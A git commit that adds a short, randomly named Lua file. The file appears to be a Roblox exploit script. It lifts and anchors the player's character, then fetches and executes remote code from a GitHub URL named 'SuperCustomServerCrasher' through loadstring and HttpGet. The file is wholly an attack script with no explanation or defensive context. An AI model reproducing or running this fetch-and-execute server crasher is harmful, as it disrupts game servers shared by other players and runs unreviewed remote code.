1dc0c9c5260da1b1f38d85984c90354823d57695
James <82015460+slama0001@users.noreply.github.com>
2022-07-08 15:18:11 -0400

    Create IEOlRPibrqPJoFReIITA.lua

---
+++ IEOlRPibrqPJoFReIITA.lua
@@ -0,0 +1,4 @@
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Y+10000,game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
+wait()
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
